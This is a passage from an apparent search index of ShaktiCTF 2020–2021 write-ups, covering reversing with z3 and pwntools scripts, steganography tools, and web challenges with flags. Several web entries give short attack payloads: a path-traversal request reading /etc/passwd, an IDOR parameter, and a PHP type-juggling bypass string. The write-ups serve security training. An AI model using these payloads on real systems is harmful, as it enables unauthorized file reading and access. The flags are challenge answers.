hopefully was backed up. Could you figure out the passcode and run the program successfully.","title":"Challenge Description"},{"location":"ShaktiCTF20/reversing/damez/#short-writeup","text":"String Compare. The flag is hardcoded in the binary. If you simply do strings challfile you get all the strings in the program. One of them is the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/reversing/damez/#flag","text":"shaktictf{K33p_th3_gam3_g0ing_gurl!}","title":"Flag"},{"location":"ShaktiCTF20/reversing/intro/","text":"Reversing Challenge Name Level Author Concept damEz Very Easy dhr33ti string compare Assemble! Easy imm0rt4l_5t4rk assembly EZ Easy bl4ck_Widw windows PYthn Easy bl4ck_Widw python reversing REach The Moon Medium imm0rt4l_5t4rk z3 XOXO Hard 4lex1 game based","title":"Reversing"},{"location":"ShaktiCTF20/reversing/intro/#reversing","text":"Challenge Name Level Author Concept damEz Very Easy dhr33ti string compare Assemble! Easy imm0rt4l_5t4rk assembly EZ Easy bl4ck_Widw windows PYthn Easy bl4ck_Widw python reversing REach The Moon Medium imm0rt4l_5t4rk z3 XOXO Hard 4lex1 game based","title":"Reversing"},{"location":"ShaktiCTF20/reversing/reach_the_moon/","text":"REach The Moon Challenge author imm0rt4l_5t4rk Challenge points: 200 Challenge solves: 6 Challenge Description Enter the correct flag to reach the moon. Your input will include shaktictf{} in it. Keep that in mind. Solution In the challenge the program asks us to input two strings eac of which is of length 17. Using the two strings various operations are conducted using them and the result is stored in a check array. The check array is being compared to a string of length 20 which is shaktictf{N0FL4GY3t?} . If it passes the comparison it gives us the flag(which was our input itself). Otherwise if it fails it returns Not there yett. To solve such a challenge where we have to find a probable answer consisting of many equations and conditions that are not solvable by hand or are time taking we generally use python tools such as z3-solver or angr. Below is a z3 script to get one definite solution based on the conditions given in the challenge. from z3 import * a1 = [ BitVec(\"a1[0]\", 16), BitVec(\"a1[1]\", 16), BitVec(\"a1[2]\", 16), BitVec(\"a1[3]\", 16), BitVec(\"a1[4]\", 16), BitVec(\"a1[5]\", 16), BitVec(\"a1[6]\", 16), BitVec(\"a1[7]\", 16), BitVec(\"a1[8]\", 16), BitVec(\"a1[9]\", 16), BitVec(\"a1[10]\", 16), BitVec(\"a1[11]\", 16), BitVec(\"a1[12]\", 16), BitVec(\"a1[13]\", 16), BitVec(\"a1[14]\", 16), BitVec(\"a1[15]\", 16), BitVec(\"a1[16]\", 16) ] a2 = [ BitVec(\"a2[0]\", 16), BitVec(\"a2[1]\", 16), BitVec(\"a2[2]\", 16), BitVec(\"a2[3]\", 16), BitVec(\"a2[4]\", 16), BitVec(\"a2[5]\", 16), BitVec(\"a2[6]\", 16), BitVec(\"a2[7]\", 16), BitVec(\"a2[8]\", 16), BitVec(\"a2[9]\", 16), BitVec(\"a2[10]\", 16), BitVec(\"a2[11]\", 16), BitVec(\"a2[12]\", 16), BitVec(\"a2[13]\", 16), BitVec(\"a2[14]\", 16), BitVec(\"a2[15]\", 16), BitVec(\"a2[16]\", 16) ] check = \"shaktictf{0Fl4gY3t?}\"; c = [] for i in range(len(check)): c.append(ord(check[i])) s = Solver() for i in range(17): s.add(a1[i]>40, a1[i]<127) s.add(a2[i]>40, a2[i]<127) s.add(c[0] == a1[0]) #We have hardcoded the starting characters to be 'shaktictf{' and last character to be '}' because it says in the s.add(c[1] == a1[1]) #description that the input will have the flag format in it. s.add(c[2] == a1[2]) s.add(c[3] == a1[3]) s.add(c[4] == a1[4]) s.add(c[5] == a1[5]) s.add(c[6] == a1[6]) s.add(c[7] == a1[7]) s.add(c[8] == a1[8]) s.add(c[9] == a1[9]) s.add(c[19] == a2[16]) print(s.check()) s.add(c[0] == (a1[0] - 71) ^ a2[0]) s.add(c[1] == LShR(a1[1],2) + (a2[1] - 0x7)) print(s.check()) s.add(c[2] == (3 * (a2[2] - (a1[2] ^ 0x2d))) - 0x14) s.add(c[3] == (2 * (a1[3] - a2[3])) ^ 0x1b) s.add(c[4] == (a1[4] + a2[4]) ^ 0xa7) s.add(c[5] == a1[5] & (a2[5] + 0x6f)) s.add(c[6] == (a1[6] % a2[6]) + 0x33) s.add(c[7] == (a1[7] ^ 0x61) + a2[7]) s.add(c[8] == (~a1[8] + 0xbd) ^ a2[8]) s.add(c[9] == (a2[9] ^ 0x30) + (a1[9] ^ 0x42)) s.add(c[19] == (LShR(a1[16], 0x2) + (a2[16] ^ 0x1d))) s.add(a2[0] == a2[10]) s.add(c[10] == LShR(a2[11], a1[11] / 0x1f)) s.add(c[11] == (a2[3] - a1[11]) * 0x23) s.add(c[12] == a2[12] ^ a1[12] ^ 0x46) s.add(c[13] == (~a2[13] % 0x100) - a1[12]) s.add(c[14] == a2[13]) s.add(c[15] == LShR(a2[14],0xc1) - (~a1[13] ^ 0x7)) s.add(c[16] == (a1[14] % 0x7a) + (a2[14] % 0x73) - 0xb8) s.add(c[17] == (a2[14] % 0x73) + (~a1[15] + 0x33)) s.add(c[18] == a1[16] % 118 & a2[15] ^ 10) l = ((a2[0] ^ 4) ^ 31) s.add(a1[10] == l) s.add(a1[10] == a2[15] + 5) s.add(a2[15] == 63) print(s.check()) #print(s.model()) m = s.model() w = '' x = '' for i in range(17): w += chr(m[a1[i]].as_long()) x += chr(m[a2[i]].as_long()) print(w) print(x) Thus our two inputs become shaktictf{D1d_y0u and _Us3_z3_0r_aNgr?} Flag shaktictf{D1d_y0u_Us3_z3_0r_aNgr?}","title":"REach The Moon"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#reach-the-moon","text":"Challenge author imm0rt4l_5t4rk Challenge points: 200 Challenge solves: 6","title":"REach The Moon"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#challenge-description","text":"Enter the correct flag to reach the moon. Your input will include shaktictf{} in it. Keep that in mind.","title":"Challenge Description"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#solution","text":"In the challenge the program asks us to input two strings eac of which is of length 17. Using the two strings various operations are conducted using them and the result is stored in a check array. The check array is being compared to a string of length 20 which is shaktictf{N0FL4GY3t?} . If it passes the comparison it gives us the flag(which was our input itself). Otherwise if it fails it returns Not there yett. To solve such a challenge where we have to find a probable answer consisting of many equations and conditions that are not solvable by hand or are time taking we generally use python tools such as z3-solver or angr. Below is a z3 script to get one definite solution based on the conditions given in the challenge. from z3 import * a1 = [ BitVec(\"a1[0]\", 16), BitVec(\"a1[1]\", 16), BitVec(\"a1[2]\", 16), BitVec(\"a1[3]\", 16), BitVec(\"a1[4]\", 16), BitVec(\"a1[5]\", 16), BitVec(\"a1[6]\", 16), BitVec(\"a1[7]\", 16), BitVec(\"a1[8]\", 16), BitVec(\"a1[9]\", 16), BitVec(\"a1[10]\", 16), BitVec(\"a1[11]\", 16), BitVec(\"a1[12]\", 16), BitVec(\"a1[13]\", 16), BitVec(\"a1[14]\", 16), BitVec(\"a1[15]\", 16), BitVec(\"a1[16]\", 16) ] a2 = [ BitVec(\"a2[0]\", 16), BitVec(\"a2[1]\", 16), BitVec(\"a2[2]\", 16), BitVec(\"a2[3]\", 16), BitVec(\"a2[4]\", 16), BitVec(\"a2[5]\", 16), BitVec(\"a2[6]\", 16), BitVec(\"a2[7]\", 16), BitVec(\"a2[8]\", 16), BitVec(\"a2[9]\", 16), BitVec(\"a2[10]\", 16), BitVec(\"a2[11]\", 16), BitVec(\"a2[12]\", 16), BitVec(\"a2[13]\", 16), BitVec(\"a2[14]\", 16), BitVec(\"a2[15]\", 16), BitVec(\"a2[16]\", 16) ] check = \"shaktictf{0Fl4gY3t?}\"; c = [] for i in range(len(check)): c.append(ord(check[i])) s = Solver() for i in range(17): s.add(a1[i]>40, a1[i]<127) s.add(a2[i]>40, a2[i]<127) s.add(c[0] == a1[0]) #We have hardcoded the starting characters to be 'shaktictf{' and last character to be '}' because it says in the s.add(c[1] == a1[1]) #description that the input will have the flag format in it. s.add(c[2] == a1[2]) s.add(c[3] == a1[3]) s.add(c[4] == a1[4]) s.add(c[5] == a1[5]) s.add(c[6] == a1[6]) s.add(c[7] == a1[7]) s.add(c[8] == a1[8]) s.add(c[9] == a1[9]) s.add(c[19] == a2[16]) print(s.check()) s.add(c[0] == (a1[0] - 71) ^ a2[0]) s.add(c[1] == LShR(a1[1],2) + (a2[1] - 0x7)) print(s.check()) s.add(c[2] == (3 * (a2[2] - (a1[2] ^ 0x2d))) - 0x14) s.add(c[3] == (2 * (a1[3] - a2[3])) ^ 0x1b) s.add(c[4] == (a1[4] + a2[4]) ^ 0xa7) s.add(c[5] == a1[5] & (a2[5] + 0x6f)) s.add(c[6] == (a1[6] % a2[6]) + 0x33) s.add(c[7] == (a1[7] ^ 0x61) + a2[7]) s.add(c[8] == (~a1[8] + 0xbd) ^ a2[8]) s.add(c[9] == (a2[9] ^ 0x30) + (a1[9] ^ 0x42)) s.add(c[19] == (LShR(a1[16], 0x2) + (a2[16] ^ 0x1d))) s.add(a2[0] == a2[10]) s.add(c[10] == LShR(a2[11], a1[11] / 0x1f)) s.add(c[11] == (a2[3] - a1[11]) * 0x23) s.add(c[12] == a2[12] ^ a1[12] ^ 0x46) s.add(c[13] == (~a2[13] % 0x100) - a1[12]) s.add(c[14] == a2[13]) s.add(c[15] == LShR(a2[14],0xc1) - (~a1[13] ^ 0x7)) s.add(c[16] == (a1[14] % 0x7a) + (a2[14] % 0x73) - 0xb8) s.add(c[17] == (a2[14] % 0x73) + (~a1[15] + 0x33)) s.add(c[18] == a1[16] % 118 & a2[15] ^ 10) l = ((a2[0] ^ 4) ^ 31) s.add(a1[10] == l) s.add(a1[10] == a2[15] + 5) s.add(a2[15] == 63) print(s.check()) #print(s.model()) m = s.model() w = '' x = '' for i in range(17): w += chr(m[a1[i]].as_long()) x += chr(m[a2[i]].as_long()) print(w) print(x) Thus our two inputs become shaktictf{D1d_y0u and _Us3_z3_0r_aNgr?}","title":"Solution"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#flag","text":"shaktictf{D1d_y0u_Us3_z3_0r_aNgr?}","title":"Flag"},{"location":"ShaktiCTF20/reversing/xoxo/","text":"XOXO Challenge Description During the early days of Apollo, software was not taken as seriously as other engineering disciplines. Though in fact we had a complex system of systems, we weren\u2019t getting credit for what was a legitimate field. It was out of desperation I came up with the term, to say: \u201cHey, we\u2019re engineering too.\u201d Lets play by my rules. Writeup The game does not let the player play at anyposition also does not let the server play at any position. But finally a pattern is achieved once all positions are filled but again this has to be achieved in a certain sequence which is to be obtained deom the final check matrix function which checks if the input sequence was in this order : l=[7,51, 3, 73, 71, 2, 35, 77, 6, 79, 26, 38, 53, 27, 44, 78, 45, 21, 36, 33, 59, 29, 17, 5, 56, 42, 24, 47, 18, 9, 74, 20, 75, 54, 23, 22, 60, 63, 57, 1, 62] Initially you need to open the binary using ghidra and open the disassembly view using the code browser from ghidra. On the left side you can see the symbol table where every function from the program is listed and from there you can search for the main function to get the starting point of the program. As you go through the program you can see the other functions and from the names of the function you can see that there is a function called the seq_check which sounds fishy. And if you go through it you can see a check. here the sequence array is hard coded and on xoring these values with 0x1337 you get the sequence in which you should give your input. Script from pwn import * user_seq = ['8', '52', '4', '74', '72', '3', '36', '78', '7', '80', '27', '39', '54', '28', '45', '79', '46', '22', '37', '34', '60', '30', '18', '6', '57', '43', '25', '48', '19', '10', '75', '21', '76', '55', '24', '23', '61', '64', '58', '2', '63'] #user_seq = ['7', '51', '3', '73', '71', '2', '35', '77', '6', '79', '26', '38', '53', '27', '44', '78', '45', '21', '36', '33', '59', '29', '17', '5', '56', '42', '24', '47', '18', '9', '74', '20', '75', '54', '23', '22', '60', '63', '57', '1', '62'] #io=process(\"./a.out\") io= remote(\"0.0.0.0\", 1111) for i in range(len(user_seq)): print(\"running \"+str(i)) io.recv() io.sendline(bytes(user_seq[i],'utf-8')) print(io.recvall()) Flag is obtained when sequence is achieved. Flag shaktictf{XOXO_g0n3_to0_f4r_??_XD}","title":"XOXO"},{"location":"ShaktiCTF20/reversing/xoxo/#xoxo","text":"","title":"XOXO"},{"location":"ShaktiCTF20/reversing/xoxo/#challenge-description","text":"During the early days of Apollo, software was not taken as seriously as other engineering disciplines. Though in fact we had a complex system of systems, we weren\u2019t getting credit for what was a legitimate field. It was out of desperation I came up with the term, to say: \u201cHey, we\u2019re engineering too.\u201d Lets play by my rules.","title":"Challenge Description"},{"location":"ShaktiCTF20/reversing/xoxo/#writeup","text":"The game does not let the player play at anyposition also does not let the server play at any position. But finally a pattern is achieved once all positions are filled but again this has to be achieved in a certain sequence which is to be obtained deom the final check matrix function which checks if the input sequence was in this order : l=[7,51, 3, 73, 71, 2, 35, 77, 6, 79, 26, 38, 53, 27, 44, 78, 45, 21, 36, 33, 59, 29, 17, 5, 56, 42, 24, 47, 18, 9, 74, 20, 75, 54, 23, 22, 60, 63, 57, 1, 62] Initially you need to open the binary using ghidra and open the disassembly view using the code browser from ghidra. On the left side you can see the symbol table where every function from the program is listed and from there you can search for the main function to get the starting point of the program. As you go through the program you can see the other functions and from the names of the function you can see that there is a function called the seq_check which sounds fishy. And if you go through it you can see a check. here the sequence array is hard coded and on xoring these values with 0x1337 you get the sequence in which you should give your input.","title":"Writeup"},{"location":"ShaktiCTF20/reversing/xoxo/#script","text":"from pwn import * user_seq = ['8', '52', '4', '74', '72', '3', '36', '78', '7', '80', '27', '39', '54', '28', '45', '79', '46', '22', '37', '34', '60', '30', '18', '6', '57', '43', '25', '48', '19', '10', '75', '21', '76', '55', '24', '23', '61', '64', '58', '2', '63'] #user_seq = ['7', '51', '3', '73', '71', '2', '35', '77', '6', '79', '26', '38', '53', '27', '44', '78', '45', '21', '36', '33', '59', '29', '17', '5', '56', '42', '24', '47', '18', '9', '74', '20', '75', '54', '23', '22', '60', '63', '57', '1', '62'] #io=process(\"./a.out\") io= remote(\"0.0.0.0\", 1111) for i in range(len(user_seq)): print(\"running \"+str(i)) io.recv() io.sendline(bytes(user_seq[i],'utf-8')) print(io.recvall()) Flag is obtained when sequence is achieved.","title":"Script"},{"location":"ShaktiCTF20/reversing/xoxo/#flag","text":"shaktictf{XOXO_g0n3_to0_f4r_??_XD}","title":"Flag"},{"location":"ShaktiCTF20/stego/hidd3n/","text":"Hidd3n Challenge Description Seems like there is something hidden in this image. Can you find it out? Short writeup The string given in the Comment section of exiftool is base64 encoded. Decode it and we get a passphrase. Use steghide and enter the passphrase to view the flag. Challenge Author v1Ru5 Flag shaktictf{G00d!_b3st_0f_luck_f0r_th3_n3xt_chall3nge}","title":"Hidd3n"},{"location":"ShaktiCTF20/stego/hidd3n/#hidd3n","text":"","title":"Hidd3n"},{"location":"ShaktiCTF20/stego/hidd3n/#challenge-description","text":"Seems like there is something hidden in this image. Can you find it out?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/hidd3n/#short-writeup","text":"The string given in the Comment section of exiftool is base64 encoded. Decode it and we get a passphrase. Use steghide and enter the passphrase to view the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/hidd3n/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/hidd3n/#flag","text":"shaktictf{G00d!_b3st_0f_luck_f0r_th3_n3xt_chall3nge}","title":"Flag"},{"location":"ShaktiCTF20/stego/intro/","text":"Steganography Challenge Name Level Author Concept Invisible Very Easy v1Ru5 stegsnow,morse Just Crack It Easy v1Ru5 steghide,stegcracker Hidd3n Easy v1Ru5 exiftool,steghide Secret Medium v1Ru5 audacity Pretty Good Medium v1Ru5 pgp decryption","title":"Steganography"},{"location":"ShaktiCTF20/stego/intro/#steganography","text":"Challenge Name Level Author Concept Invisible Very Easy v1Ru5 stegsnow,morse Just Crack It Easy v1Ru5 steghide,stegcracker Hidd3n Easy v1Ru5 exiftool,steghide Secret Medium v1Ru5 audacity Pretty Good Medium v1Ru5 pgp decryption","title":"Steganography"},{"location":"ShaktiCTF20/stego/invisible/","text":"Invisible Stego Author : v1Ru5 Challenge Description One of our engineer got some clues regarding a recent attack in the city, using her knowledge on networking. Can you connect the dots and help us? Flag Format : shaktictf{STRING} Short writeup: The image file is a rabbit hole. Perform stegsnow on the text file and decode the morse to get the flag. flag : shaktictf{AM1V1SIBL3N0W}","title":"Invisible"},{"location":"ShaktiCTF20/stego/invisible/#invisible","text":"","title":"Invisible"},{"location":"ShaktiCTF20/stego/invisible/#stego","text":"Author : v1Ru5","title":"Stego"},{"location":"ShaktiCTF20/stego/invisible/#challenge-description","text":"One of our engineer got some clues regarding a recent attack in the city, using her knowledge on networking. Can you connect the dots and help us? Flag Format : shaktictf{STRING}","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/invisible/#short-writeup","text":"The image file is a rabbit hole. Perform stegsnow on the text file and decode the morse to get the flag. flag : shaktictf{AM1V1SIBL3N0W}","title":"Short writeup:"},{"location":"ShaktiCTF20/stego/just_crack_it/","text":"Just Crack It Challenge Description One of our Network Security Analyst intercepted the communication between some spies from other country and concluded that they used two images to transmit the message. Can you help us? Short writeup Perform 'stegcracker hacker.jpg ' and use that password (14ms0c00l!) while performing 'steghide extract -sf laptop.jpg' to get the flag. Challenge Author v1Ru5 Flag shaktictf{y0u_M4d3_iT_85284501}","title":"Just Crack It"},{"location":"ShaktiCTF20/stego/just_crack_it/#just-crack-it","text":"","title":"Just Crack It"},{"location":"ShaktiCTF20/stego/just_crack_it/#challenge-description","text":"One of our Network Security Analyst intercepted the communication between some spies from other country and concluded that they used two images to transmit the message. Can you help us?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/just_crack_it/#short-writeup","text":"Perform 'stegcracker hacker.jpg ' and use that password (14ms0c00l!) while performing 'steghide extract -sf laptop.jpg' to get the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/just_crack_it/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/just_crack_it/#flag","text":"shaktictf{y0u_M4d3_iT_85284501}","title":"Flag"},{"location":"ShaktiCTF20/stego/pretty_good/","text":"Pretty Good Challenge Description Ever since she got to know about this privacy technique, she believed that this was the best encryption method. Can you prove her wrong by finding out the message? Short writeup Perform zbarimg on the qrcode to get the private key and and jsteg and strings on the second image to get the message and passphrase. Use any pgp decryption tool and decode the obtained ROT13 message to see the flag. Challenge Author v1Ru5 Flag skaktictf{jU5t_dr1nk_m0r3_c0ff33}","title":"Pretty Good"},{"location":"ShaktiCTF20/stego/pretty_good/#pretty-good","text":"","title":"Pretty Good"},{"location":"ShaktiCTF20/stego/pretty_good/#challenge-description","text":"Ever since she got to know about this privacy technique, she believed that this was the best encryption method. Can you prove her wrong by finding out the message?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/pretty_good/#short-writeup","text":"Perform zbarimg on the qrcode to get the private key and and jsteg and strings on the second image to get the message and passphrase. Use any pgp decryption tool and decode the obtained ROT13 message to see the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/pretty_good/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/pretty_good/#flag","text":"skaktictf{jU5t_dr1nk_m0r3_c0ff33}","title":"Flag"},{"location":"ShaktiCTF20/stego/secret/","text":"Secret Challenge Description An American computer network engineer tried to convey something about a breach that happened recently, but we couldn't understand anything. We have a recording of her conversation with us. Can you help us in retrieving the information? Short writeup Open the file in hex editor and change the file header. Open the file using Audacity and reverse the audio. Change the speed and listen carefully. Challenge Author v1Ru5 Flag shaktictf{th15_w45_4n_e4sy_ch4lleng3}","title":"Secret"},{"location":"ShaktiCTF20/stego/secret/#secret","text":"","title":"Secret"},{"location":"ShaktiCTF20/stego/secret/#challenge-description","text":"An American computer network engineer tried to convey something about a breach that happened recently, but we couldn't understand anything. We have a recording of her conversation with us. Can you help us in retrieving the information?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/secret/#short-writeup","text":"Open the file in hex editor and change the file header. Open the file using Audacity and reverse the audio. Change the speed and listen carefully.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/secret/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/secret/#flag","text":"shaktictf{th15_w45_4n_e4sy_ch4lleng3}","title":"Flag"},{"location":"ShaktiCTF20/web/ador/","text":"Ador Challenge Description Ada was born on 10 December 1815 not 12, identification change makes a difference Short Writeup In the source code, you will find that name parameter is set to a default user, when we login with name as \"admin\", we get an idor and receive flag. Payload= ?name=admin Flag shaktictf{f1r5t_c0mpu73r_pr0gr4mm3r}","title":"Ador"},{"location":"ShaktiCTF20/web/ador/#ador","text":"","title":"Ador"},{"location":"ShaktiCTF20/web/ador/#challenge-description","text":"Ada was born on 10 December 1815 not 12, identification change makes a difference","title":"Challenge Description"},{"location":"ShaktiCTF20/web/ador/#short-writeup","text":"In the source code, you will find that name parameter is set to a default user, when we login with name as \"admin\", we get an idor and receive flag. Payload= ?name=admin","title":"Short Writeup"},{"location":"ShaktiCTF20/web/ador/#flag","text":"shaktictf{f1r5t_c0mpu73r_pr0gr4mm3r}","title":"Flag"},{"location":"ShaktiCTF20/web/authen/","text":"Authen Challenge Description Ada is important to the world, she is important for a reason Short Writeup In the login, check source code, decode the weak authentication of password to get flag (console.log(String.fromCharCode(115, 104, 97, 107, 116, 105, 99, 116, 102, 123, 98, 51, 121, 48, 110, 100, 95, 112, 117, 114, 51, 95, 99, 52, 108, 99, 117, 108, 97, 116, 105, 48, 110, 115, 125)); Flag shaktictf{b3y0nd_pur3_c4lculati0ns}","title":"Authen"},{"location":"ShaktiCTF20/web/authen/#authen","text":"","title":"Authen"},{"location":"ShaktiCTF20/web/authen/#challenge-description","text":"Ada is important to the world, she is important for a reason","title":"Challenge Description"},{"location":"ShaktiCTF20/web/authen/#short-writeup","text":"In the login, check source code, decode the weak authentication of password to get flag (console.log(String.fromCharCode(115, 104, 97, 107, 116, 105, 99, 116, 102, 123, 98, 51, 121, 48, 110, 100, 95, 112, 117, 114, 51, 95, 99, 52, 108, 99, 117, 108, 97, 116, 105, 48, 110, 115, 125));","title":"Short Writeup"},{"location":"ShaktiCTF20/web/authen/#flag","text":"shaktictf{b3y0nd_pur3_c4lculati0ns}","title":"Flag"},{"location":"ShaktiCTF20/web/biscuits/","text":"Biscuits Author m0n574 Challenge Description Ada Lovelace used to love eating french biscuits during her work Short Writeup The cookie has the flag which should be hex decoded Flag shaktictf{c00k13s_m4k3_phr3n0l0gy&m3sm3r15m_3asy}","title":"Biscuits"},{"location":"ShaktiCTF20/web/biscuits/#biscuits","text":"","title":"Biscuits"},{"location":"ShaktiCTF20/web/biscuits/#author","text":"m0n574","title":"Author"},{"location":"ShaktiCTF20/web/biscuits/#challenge-description","text":"Ada Lovelace used to love eating french biscuits during her work","title":"Challenge Description"},{"location":"ShaktiCTF20/web/biscuits/#short-writeup","text":"The cookie has the flag which should be hex decoded","title":"Short Writeup"},{"location":"ShaktiCTF20/web/biscuits/#flag","text":"shaktictf{c00k13s_m4k3_phr3n0l0gy&m3sm3r15m_3asy}","title":"Flag"},{"location":"ShaktiCTF20/web/doors/","text":"Doors Challenge Description Ada Loves to travel to places, London-Paris-Spain and discover more Short Writeup You have to lfi to /etc/password via the ?page= paramater eg ?page=../../../etc/passwd Flag shaktictf{c4lculu5_0f_7h3_n3rv0u5_5y5t3m}","title":"Doors"},{"location":"ShaktiCTF20/web/doors/#doors","text":"","title":"Doors"},{"location":"ShaktiCTF20/web/doors/#challenge-description","text":"Ada Loves to travel to places, London-Paris-Spain and discover more","title":"Challenge Description"},{"location":"ShaktiCTF20/web/doors/#short-writeup","text":"You have to lfi to /etc/password via the ?page= paramater eg ?page=../../../etc/passwd","title":"Short Writeup"},{"location":"ShaktiCTF20/web/doors/#flag","text":"shaktictf{c4lculu5_0f_7h3_n3rv0u5_5y5t3m}","title":"Flag"},{"location":"ShaktiCTF20/web/intro/","text":"Web Exploitation Challenge Name Level Author Concept Ador Easy m0n574 Idor Authen Easy m0n574 Weak authentication check Biscuits Easy m0n574 Vulnerable Cookie Machine Easy m0n574 Crawlers Doors Medium m0n574 LFI PHPhar Medium m0n574 PHP vulnerabilities","title":"Web Exploitation"},{"location":"ShaktiCTF20/web/intro/#web-exploitation","text":"Challenge Name Level Author Concept Ador Easy m0n574 Idor Authen Easy m0n574 Weak authentication check Biscuits Easy m0n574 Vulnerable Cookie Machine Easy m0n574 Crawlers Doors Medium m0n574 LFI PHPhar Medium m0n574 PHP vulnerabilities","title":"Web Exploitation"},{"location":"ShaktiCTF20/web/machine/","text":"Machine Author m0n574 Challenge Description Babbage was impressed by Lovelace's intellect and analytic skills that he called her a humanoid Short Writeup The robots.txt files shows the disallowed files where the flag is kept Flag shaktictf{7h3_3nch4n7r355_0f_Nu3b3r}","title":"Machine"},{"location":"ShaktiCTF20/web/machine/#machine","text":"","title":"Machine"},{"location":"ShaktiCTF20/web/machine/#author","text":"m0n574","title":"Author"},{"location":"ShaktiCTF20/web/machine/#challenge-description","text":"Babbage was impressed by Lovelace's intellect and analytic skills that he called her a humanoid","title":"Challenge Description"},{"location":"ShaktiCTF20/web/machine/#short-writeup","text":"The robots.txt files shows the disallowed files where the flag is kept","title":"Short Writeup"},{"location":"ShaktiCTF20/web/machine/#flag","text":"shaktictf{7h3_3nch4n7r355_0f_Nu3b3r}","title":"Flag"},{"location":"ShaktiCTF20/web/phphar/","text":"PHPhar Challenge Description Explaining the Analytical Engine's function was a difficult task, bypass the basic php to see what she tried to explain Short Writeup bypass first function by giving an exponential value, second check by giving a decimal value with total 13 letters and the value before the . being 1337, for third check use array indice manipulation of the two parameters being checked to bypass the sha1 check, for the fourth check, provide a md4 with 0e followed by xxxx which would be a loose comparison with 0e and for the last check use an array to bypass the strcmp() Payload --> flag0=9e9&secret=1337.12345678&a[0]=asd&b[1]=dsf&md4=0e251288019&abc[]=sdff Flag shaktictf{An4ly71c4l_Eng1n3!=D1ff3r3nc3_Eng1n3}","title":"PHPhar"},{"location":"ShaktiCTF20/web/phphar/#phphar","text":"","title":"PHPhar"},{"location":"ShaktiCTF20/web/phphar/#challenge-description","text":"Explaining the Analytical Engine's function was a difficult task, bypass the basic php to see what she tried to explain","title":"Challenge Description"},{"location":"ShaktiCTF20/web/phphar/#short-writeup","text":"bypass first function by giving an exponential value, second check by giving a decimal value with total 13 letters and the value before the . being 1337, for third check use array indice manipulation of the two parameters being checked to bypass the sha1 check, for the fourth check, provide a md4 with 0e followed by xxxx which would be a loose comparison with 0e and for the last check use an array to bypass the strcmp() Payload --> flag0=9e9&secret=1337.12345678&a[0]=asd&b[1]=dsf&md4=0e251288019&abc[]=sdff","title":"Short Writeup"},{"location":"ShaktiCTF20/web/phphar/#flag","text":"shaktictf{An4ly71c4l_Eng1n3!=D1ff3r3nc3_Eng1n3}","title":"Flag"},{"location":"ShaktiCTF21/crypto/intro/","text":"","title":"Intro"},{"location":"ShaktiCTF21/forensics/chunkies/","text":"Chunkies Challenge Description We could only retrieve only this file from the machine, but looks like this is corrupted. Can you recover the file? Challenge Author v1Ru5 Short Writeup The given PNG file is corrupted. Correct the header of the image. Fix IDAT and IEND chunks. On using the tool 'pngcheck' on the image, we see that there is a CRC error which can be directly corrected. Flag shaktictf{Y4YyyyY_y0u_g0t_1T}","title":"Chunkies"},{"location":"ShaktiCTF21/forensics/chunkies/#chunkies","text":"","title":"Chunkies"},{"location":"ShaktiCTF21/forensics/chunkies/#challenge-description","text":"We could only retrieve only this file from the machine, but looks like this is corrupted. Can you recover the file?","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/chunkies/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/chunkies/#short-writeup","text":"The given PNG file is corrupted. Correct the header of the image. Fix IDAT and IEND chunks. On using the tool 'pngcheck' on the image, we see that there is a CRC error which can be directly corrected.","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/chunkies/#flag","text":"shaktictf{Y4YyyyY_y0u_g0t_1T}","title":"Flag"},{"location":"ShaktiCTF21/forensics/delete/","text":"Delete Challenge Description Sometimes what you see is not always true... Challenge Author v1Ru5 Short Writeup When we use any hex editor, we find that there are two PNG headers. Removing the bytes before the second PNG header gives us the flag. Flag shaktictf{Y0u_4R3_aM4z1nG!!!!}","title":"Delete"},{"location":"ShaktiCTF21/forensics/delete/#delete","text":"","title":"Delete"},{"location":"ShaktiCTF21/forensics/delete/#challenge-description","text":"Sometimes what you see is not always true...","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/delete/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/delete/#short-writeup","text":"When we use any hex editor, we find that there are two PNG headers. Removing the bytes before the second PNG header gives us the flag.","title":"Short Writeup"},{"location":"ShaktiCTF21/forensics/delete/#flag","text":"shaktictf{Y0u_4R3_aM4z1nG!!!!}","title":"Flag"},{"location":"ShaktiCTF21/forensics/find/","text":"Find Me Challenge Description We found that there was a secret communication between two criminals. Can you find out the secret information? Challenge Author v1Ru5 Short Writeup Following up the TCP stream gives us this: 98 106 66 48 100 71 103 48 100 71 86 104 78 88 107 61 On converting the numbers from decimal to ASCII gives us 'bjB0dGg0dGVhNXk=' which when base64 decoded gives 'n0tth4tea5y'. The second TCP stream gives us a reversed zip file which after reversing back and using 'n0tth4tea5y' as the password gives us flag.txt. Flag shaktictf{g00d_lUcK_4_tH3_n3xT_cH411eNg3}","title":"Find Me"},{"location":"ShaktiCTF21/forensics/find/#find-me","text":"","title":"Find Me"},{"location":"ShaktiCTF21/forensics/find/#challenge-description","text":"We found that there was a secret communication between two criminals. Can you find out the secret information?","title":"Challenge Description"},{"location":"ShaktiCTF21/forensics/find/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF21/forensics/find/#short-writeup","text":"Following up the TCP stream gives us this: 98 106 66 48 100 71 103 48 100 71 86 104 78 88 107 61 On converting the numbers from decimal to ASCII gives us 